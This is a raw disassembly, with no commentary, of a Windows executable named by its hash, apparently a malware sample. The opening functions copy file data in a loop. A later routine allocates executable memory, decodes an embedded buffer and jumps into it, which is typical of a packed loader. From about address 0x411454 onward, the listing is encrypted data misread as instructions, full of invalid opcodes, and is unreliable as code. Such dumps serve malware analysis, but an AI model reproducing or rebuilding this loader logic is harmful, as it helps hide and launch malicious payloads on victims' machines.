
01c1a9179258495d08e017d721fc82c7fa8e09f29fa34411b590763e14312dc5.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0xbace2637
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	test   eax,0xe2572d78
  41145f:	int    0xe4
  411461:	into   
  411462:	dec    ebx
  411463:	sub    BYTE PTR [eax+0x58],0xf5
  411467:	cs mov al,0x24
  41146a:	lods   al,BYTE PTR ds:[esi]
  41146b:	mov    bl,0xb7
  41146d:	sbb    al,0x55
  41146f:	popa   
  411470:	mov    BYTE PTR [eax-0x94a8fad],cl
  411476:	(bad)  
  411477:	and    ecx,DWORD PTR [ebx+0x76]
  41147a:	add    DWORD PTR [ebp-0x3df3d2e7],edx
  411480:	(bad)
  411484:	or     BYTE PTR [edi+0x21],0x66
  411488:	xchg   edx,eax
  411489:	pop    bp
  41148b:	and    eax,0xda9ed530
  411490:	pushf  
  411491:	iret   
  411492:	dec    ebp
  411493:	xlat   BYTE PTR ds:[ebx]
  411494:	mov    edi,0x13bcc720
  411499:	scas   al,BYTE PTR es:[edi]
  41149a:	push   eax
  41149b:	xchg   esi,eax
  41149c:	sbb    cl,ch
  41149e:	idiv   DWORD PTR [eax+esi*1-0x4166dde0]
  4114a5:	add    eax,0x7202aa43
  4114aa:	sahf   
  4114ab:	adc    DWORD PTR [edx+0x3e],eax
  4114ae:	mov    cl,0x92
  4114b0:	shl    DWORD PTR [ecx-0x77],cl
  4114b3:	scas   al,BYTE PTR es:[edi]
  4114b4:	jl     0x41146b
  4114b6:	mov    dl,0x45
  4114b8:	dec    esp
  4114b9:	or     eax,0x9982a848
  4114be:	push   ebx
  4114bf:	movups xmm5,XMMWORD PTR [edx]
  4114c2:	cmp    DWORD PTR [edi],ebp
  4114c4:	jne    0x4114e1
  4114c6:	or     BYTE PTR [ecx],0xd2
  4114c9:	aad    0x81
  4114cb:	push   esi
  4114cc:	mov    gs,WORD PTR [ebp-0x77eafcbf]
  4114d2:	mov    ecx,0xc92f9ec2
  4114d7:	and    eax,0xa4944a7
  4114dc:	ficomp WORD PTR es:[ecx+0x12554df8]
  4114e3:	lods   eax,DWORD PTR ds:[esi]
  4114e4:	add    DWORD PTR [edx-0x27],esi
  4114e7:	jnp    0x4114ae
  4114e9:	repnz (bad) 
  4114eb:	cmp    eax,0xcc55e02
  4114f0:	lds    ebx,FWORD PTR [ebx+0x14]
  4114f3:	jns    0x41148c
  4114f5:	ins    DWORD PTR es:[edi],dx
  4114f6:	push   ecx
  4114f7:	mov    dh,0x3b
  4114f9:	out    0x64,al
  4114fb:	add    eax,0x93815335
  411500:	jb     0x411543
  411502:	xchg   esp,eax
  411503:	cmp    al,0x59
  411505:	xchg   BYTE PTR [ebp+0x7b51203e],bh
  41150b:	outs   dx,BYTE PTR ds:[esi]
  41150c:	bound  edx,QWORD PTR [ebp+0x19]
  41150f:	sbb    cl,BYTE PTR [edi-0x61c42843]
  411515:	mov    esp,0x2ea58c6a
  41151a:	jl     0x411549
  41151c:	div    edx
  41151e:	xor    DWORD PTR ds:0x71915d6,edx
  411524:	fs enter 0xed8e,0x9c
  411529:	fmul   DWORD PTR es:[edi]
  41152c:	std    
  41152d:	call   0x943b:0xa6b972d9
  411534:	pop    edi
  411535:	retf   
  411536:	outs   dx,DWORD PTR ds:[esi]
  411537:	fs cld 
  411539:	in     eax,dx
  41153a:	mov    bh,0xa5
  41153c:	mov    WORD PTR [ecx-0x5902e682],fs
  411542:	sub    BYTE PTR [edi+0x6a],cl
  411545:	jnp    0x4115b7
  411547:	aad    0x7b
  411549:	jp     0x4115ad
  41154b:	inc    ecx
  41154c:	adc    eax,0x643c716f
  411551:	inc    ebp
  411552:	mov    eax,ds:0x6292b70d
  411557:	mov    esp,0xa8349d52
  41155c:	inc    eax
  41155d:	mov    BYTE PTR [ebp+0x4af1a3c0],al
  411563:	mov    al,ds:0x4c2ec946
  411568:	add    DWORD PTR [eax-0x2c33f293],ecx
  41156e:	mov    bl,BYTE PTR [ebp+0x109e9efe]
  411574:	pop    eax
  411575:	out    dx,al
  411576:	leave  
  411577:	gs leave 
  411579:	cmp    al,0xc2
  41157b:	sbb    eax,0xdcf2dca7
  411580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411582:	call   0xce14eb77
  411587:	out    dx,al
  411588:	xchg   esi,eax
  411589:	mov    dl,0x40
  41158b:	mov    DWORD PTR [ecx],esp
  41158d:	push   0xfffffffa
  41158f:	mov    ch,0xcf
  411591:	sub    eax,DWORD PTR [ecx+0x63]
  411594:	mov    ds:0x215df0f4,eax
  411599:	push   edi
  41159a:	xchg   ebp,eax
  41159b:	pop    eax
  41159c:	fldln2 
  41159e:	push   DWORD PTR [edi]
  4115a0:	lahf   
  4115a1:	push   0x4827610a
  4115a6:	repz jne 0x411559
  4115a9:	add    eax,0xd39566e
  4115ae:	dec    edi
  4115af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b0:	pusha  
  4115b1:	test   al,0x6f
  4115b3:	mov    ds:0x616b6b1f,eax
  4115b8:	jne    0x4115ee
  4115ba:	repz pop ecx
  4115bc:	jmp    0x7942:0x2e0ac3f
  4115c3:	push   0xffffffe5
  4115c5:	lock mov ?,edx
  4115c8:	rcr    eax,cl
  4115ca:	rcr    BYTE PTR fs:[esi-0x7daeda12],cl
  4115d1:	push   eax
  4115d2:	mov    ebx,edx
  4115d4:	mov    esi,0x7217d5c3
  4115d9:	push   0xffffffa5
  4115db:	jp     0x411564
  4115dd:	scas   eax,DWORD PTR es:[edi]
  4115de:	pop    esi
  4115df:	mov    cx,0x55b4
  4115e3:	and    edi,DWORD PTR [esi+0x17fdabed]
  4115e9:	into   
  4115ea:	xchg   edx,eax
  4115eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ec:	mov    esi,edx
  4115ee:	shl    BYTE PTR [ebx+0x4e],cl
  4115f1:	es jle 0x4115f4
  4115f4:	enter  0xf064,0xb6
  4115f8:	ror    BYTE PTR [edi+0x720182ea],0x87
  4115ff:	xchg   esp,eax
  411600:	ret    0xbd2
  411603:	fmul   QWORD PTR [ebx]
  411605:	std    
  411606:	pop    esi
  411607:	addr16 test eax,0xd984c844
  41160d:	fld    QWORD PTR [edi]
  41160f:	xor    DWORD PTR [eax+0x50],0xffffffb0
  411613:	xchg   edi,eax
  411614:	add    DWORD PTR [ebx],eax
  411616:	sti    
  411617:	sti    
  411618:	inc    esp
  411619:	repnz inc ebp
  41161b:	xlat   BYTE PTR ds:[ebx]
  41161c:	push   esi
  41161d:	adc    DWORD PTR [edi+esi*8],ebp
  411620:	(bad)  
  411621:	fs add eax,0x9cff2e6d
  411627:	cmp    dh,BYTE PTR gs:[esi+0x24]
  41162b:	pop    esp
  41162c:	jge    0x41164f
  41162e:	jp     0x411611
  411630:	xor    al,0x5f
  411632:	add    BYTE PTR [ebx-0x2],ch
  411635:	sub    eax,0x197f89b8
  41163a:	xchg   ecx,eax
  41163b:	cmp    al,0x32
  41163d:	or     BYTE PTR [edi-0x3b02674c],ch
  411643:	fild   WORD PTR [eax]
  411645:	cmp    eax,0xceb8f7a3
  41164a:	div    DWORD PTR [ecx+0x13]
  41164d:	add    bh,0x6c
  411650:	jo     0x4115d5
  411652:	mov    dh,0xee
  411654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411655:	jge    0x411632
  411657:	loop   0x4115de
  411659:	push   ds
  41165a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41165b:	pop    ecx
  41165c:	xchg   eax,edi
  41165e:	push   edi
  41165f:	int3   
  411660:	pop    ebp
  411661:	in     al,dx
  411662:	and    al,0x69
  411664:	ins    DWORD PTR es:[edi],dx
  411665:	add    eax,0x307ac917
  41166a:	xchg   ecx,eax
  41166b:	pushf  
  41166c:	cmp    al,0xb0
  41166e:	push   ss
  41166f:	push   ss
  411670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411671:	scas   al,BYTE PTR es:[edi]
  411672:	js     0x411685
  411674:	call   0xf3d2:0xef8e7fe5
  41167b:	push   ebp
  41167c:	cmp    DWORD PTR [esi],eax
  41167e:	jmp    0x4116ff
  411680:	inc    ecx
  411681:	cmp    al,0x6
  411683:	mov    ebx,0xb00219be
  411688:	mov    ebp,0xf2b6a0a1
  41168d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41168e:	sbb    BYTE PTR [edx-0x4e],ch
  411691:	out    0x76,al
  411693:	idiv   BYTE PTR [ebx+0x70]
  411696:	test   eax,0xaa06fbfe
  41169c:	int    0xe
  41169e:	mov    ebx,ebx
  4116a0:	add    eax,0x812c46d3
  4116a5:	or     DWORD PTR [ebx],esi
  4116a7:	int    0x5a
  4116a9:	bound  ebx,QWORD PTR [ebx+0x58103bd3]
  4116af:	cmp    bl,bl
  4116b1:	retf   
  4116b2:	retf   0xb041
  4116b5:	mov    esp,0x2bee5e17
  4116ba:	mov    dh,0xf1
  4116bc:	cmp    BYTE PTR [edx],bl
  4116be:	mov    eax,0x63d59572
  4116c3:	out    0x3f,al
  4116c5:	and    al,BYTE PTR [ebp+0x1de5d53a]
  4116cb:	scas   al,BYTE PTR es:[edi]
  4116cc:	mov    al,0x42
  4116ce:	or     DWORD PTR [esi+0x2b],eax
  4116d1:	xor    dl,BYTE PTR [ebx]
  4116d3:	lahf   
  4116d4:	enter  0x8ec7,0xa6
  4116d8:	and    DWORD PTR [edx-0xf],esp
  4116db:	xchg   ebx,eax
  4116dc:	sbb    edi,DWORD PTR [edi]
  4116de:	inc    eax
  4116df:	jno    0x41171b
  4116e1:	jmp    0x4116d4
  4116e3:	mov    dl,0xc2
  4116e5:	sbb    BYTE PTR [ebp-0x72],dh
  4116e8:	arpl   WORD PTR [edx+ebx*4-0x5866c4d],dx
  4116ef:	ins    BYTE PTR es:[edi],dx
  4116f0:	jnp    0x4116ef
  4116f2:	push   es
  4116f3:	mov    ds:0x81abb9b,eax
  4116f8:	mov    ?,ecx
  4116fa:	cmp    eax,DWORD PTR [ecx-0x5a]
  4116fd:	or     al,0xcd
  4116ff:	mov    ebp,DWORD PTR [ebx-0x7b]
  411702:	sbb    ch,BYTE PTR ds:0xbe4a71d3
  411708:	add    bh,BYTE PTR [ebp+0x5a]
  41170b:	add    DWORD PTR cs:[edi],0x39
  41170f:	jo     0x4116d1
  411711:	jmp    0x77d6:0x62236148
  411718:	cmp    BYTE PTR [edx],0xca
  41171b:	es loope 0x41179a
  41171e:	push   eax
  41171f:	xchg   ebp,eax
  411720:	loope  0x411782
  411722:	mul    BYTE PTR [edx]
  411724:	mov    esp,0x5d57e3c
  411729:	and    eax,0x56d5ca03
  41172e:	mov    eax,ds:0x4df57904
  411733:	aam    0x4b
  411735:	dec    esp
  411736:	loop   0x4117b3
  411738:	cli    
  411739:	sahf   
  41173a:	dec    edi
  41173b:	add    ch,BYTE PTR [ebx]
  41173d:	mov    ebx,0x8d0468b2
  411742:	lahf   
  411743:	jl     0x411764
  411745:	pop    es
  411746:	int3   
  411747:	dec    esp
  411748:	std    
  411749:	inc    ecx
  41174a:	pop    ecx
  41174b:	adc    DWORD PTR [eax],0xca5ca71f
  411751:	jmp    0x411715
  411753:	ret    
  411754:	aad    0x5
  411756:	or     al,0x97
  411758:	(bad)  
  41175a:	ins    BYTE PTR es:[edi],dx
  41175b:	ret    
  41175c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41175e:	jmp    0xf80a:0x1855a6b0
  411765:	leave  
  411766:	pop    ebp
  411767:	push   es
  411768:	mov    bh,BYTE PTR [ebx-0x71bc8d55]
  41176e:	enter  0xd87,0x14
  411772:	jne    0x41172d
  411774:	es adc BYTE PTR fs:[esi-0x41a21382],cl
  41177c:	mov    WORD PTR [edx+eiz*4+0x40],fs
  411780:	cdq    
  411781:	(bad)  
  411782:	mov    eax,0x5d37ca4c
  411787:	mov    esp,0x61e748e3
  41178c:	psubq  mm4,QWORD PTR [esi+0x27a5dde]
  411793:	es (bad) 
  411795:	xor    DWORD PTR [edx],edi
  411797:	jbe    0x41174d
  411799:	sbb    DWORD PTR [ebx-0x7e],edi
  41179c:	pushf  
  41179d:	mov    ebx,0x2d9f1ba4
  4117a2:	inc    edx
  4117a3:	jge    0x4117b6
  4117a5:	inc    esi
  4117a6:	mov    dh,0xa3
  4117a8:	xchg   esp,eax
  4117a9:	cmp    edi,DWORD PTR [ecx-0x6]
  4117ac:	(bad)  
  4117ad:	fcom   st(4)
  4117af:	inc    ebp
  4117b0:	mov    ds:0xb7c9ba1a,al
  4117b5:	(bad)  
  4117b7:	stos   BYTE PTR es:[edi],al
  4117b8:	or     DWORD PTR [eax+eiz*2-0x462c0f1a],ebx
  4117bf:	mov    al,ds:0xb1a089a2
  4117c4:	mov    ah,0x5
  4117c6:	mov    esp,0x21cdeb0f
  4117cb:	fisttp DWORD PTR [esi+0x7c]
  4117ce:	loopne 0x4117ca
  4117d0:	jp     0x41177d
  4117d2:	enter  0xed4b,0xbc
  4117d6:	sub    dh,BYTE PTR [edx+0xa]
  4117d9:	and    eax,0x6da3e3c7
  4117de:	js     0x41181e
  4117e0:	aas    
  4117e1:	jbe    0x411862
  4117e3:	jg     0x41183f
  4117e5:	mov    cl,0xf9
  4117e7:	add    dh,cl
  4117e9:	bound  edi,QWORD PTR [edx-0x5bd3a73b]
  4117ef:	icebp  
  4117f0:	cmp    bl,dh
  4117f2:	sbb    BYTE PTR [eax],0x28
  4117f5:	aad    0x93
  4117f7:	mov    ah,0x3e
  4117f9:	xchg   edx,eax
  4117fa:	ret    0x93ab
  4117fd:	jecxz  0x411822
  4117ff:	pop    ds
  411800:	and    BYTE PTR [edi+ebx*1-0x1f93df83],dl
  411807:	sub    edx,DWORD PTR [ecx+0x4942e9f3]
  41180d:	add    DWORD PTR [edi-0x21fe46aa],ebp
  411813:	sub    BYTE PTR [ebp+0x3d1ec62d],dh
  411819:	fldcw  WORD PTR [esi+0x1]
  41181c:	fld    st(7)
  41181e:	(bad)  
  41181f:	inc    ecx
  411820:	ror    BYTE PTR [edx-0x3ed4fbec],cl
  411826:	enter  0x2d5c,0xcb
  41182a:	jg     0x4117c6
  41182c:	test   eax,0xb668e3bb
  411831:	mov    eax,0xc5915d55
  411836:	lods   eax,DWORD PTR ds:[esi]
  411837:	pop    ebx
  411838:	neg    DWORD PTR [eax+0x5e]
  41183b:	dec    edx
  41183c:	xchg   edi,eax
  41183d:	dec    edi
  41183e:	xlat   BYTE PTR ds:[ebx]
  41183f:	mov    dl,0xb2
  411841:	sub    BYTE PTR [eax+0x6f8f0999],bl
  411847:	pop    ecx
  411848:	cmp    ah,bh
  41184a:	jnp    0x411804
  41184c:	lods   al,BYTE PTR ds:[esi]
  41184d:	imul   DWORD PTR [eax-0x169e89e9]
  411853:	xchg   BYTE PTR [ebx-0x73d2fa6d],ch
  411859:	(bad)  
  41185a:	mov    eax,0xdff188ee
  41185f:	popf   
  411860:	mov    ecx,0x329a64e0
  411865:	sub    dl,dl
  411867:	push   0xe1242dea
  41186c:	pusha  
  41186d:	xchg   esp,eax
  41186e:	stos   DWORD PTR es:[edi],eax
  41186f:	js     0x411891
  411871:	sub    BYTE PTR [ecx+0x4],ah
  411874:	add    ch,bl
  411876:	in     eax,dx
  411877:	mov    ebx,0x9173d2a2
  41187c:	ret    0x104f
  41187f:	(bad)  
  411880:	out    dx,al
  411881:	or     ch,BYTE PTR [esi+0x3cf7ae56]
  411887:	jmp    0x51b6ed1c
  41188c:	shl    edx,cl
  41188e:	xchg   ebp,eax
  41188f:	pop    ebp
  411890:	sbb    eax,0x8bc099b9
  411895:	sub    cl,bh
  411897:	pop    eax
  411898:	arpl   WORD PTR ds:0x7e81dab2,sp
  41189e:	iret   
  41189f:	cmc    
  4118a0:	or     BYTE PTR [ecx-0x52408b7e],cl
  4118a6:	xchg   ecx,eax
  4118a7:	fcom   DWORD PTR [edx+0x454a450b]
  4118ad:	js     0x4118ce
  4118af:	push   es
  4118b0:	pop    ecx
  4118b1:	nop
  4118b2:	xchg   edx,eax
  4118b3:	pop    edx
  4118b4:	mov    al,ds:0xcb91b7be
  4118b9:	ja     0x4118b4
  4118bb:	push   eax
  4118bc:	push   0xffffffdb
  4118be:	pop    edi
  4118bf:	(bad)  
  4118c0:	pushf  
  4118c1:	cmp    dl,BYTE PTR [edx+0x4f]
  4118c4:	dec    edx
  4118c5:	test   bh,cl
